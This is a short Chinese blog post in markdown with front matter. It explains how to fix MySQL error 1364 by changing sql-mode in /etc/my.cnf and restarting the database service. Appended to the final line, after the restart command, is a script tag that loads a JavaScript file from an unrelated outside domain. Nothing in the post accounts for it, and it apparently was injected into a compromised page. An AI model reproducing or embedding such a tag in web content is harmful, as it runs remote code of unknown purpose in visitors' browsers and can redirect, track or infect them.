---
id: 141
title: 'SQLSTATE[HY000]: General error: 1364 Field &#8216;xxxxx&#8217; doesn&#8217;t have a default value'
date: '2021-04-19T21:40:24+08:00'
author: gavin
layout: post
guid: 'https://gaving.top/?p=141'
permalink: /index.php/2021/04/19/sqlstatehy000-general-error-1364-field-xxxxx-doesnt-have-a-default-value/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Mysql
---

解决方法： 在/etc/my.cnf直接把sql-mode模式改变下，如下：

**sql-mode=NO\_AUTO\_CREATE\_USER,NO\_ENGINE\_SUBSTITUTION**

重启数据库 service mysqld restart<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>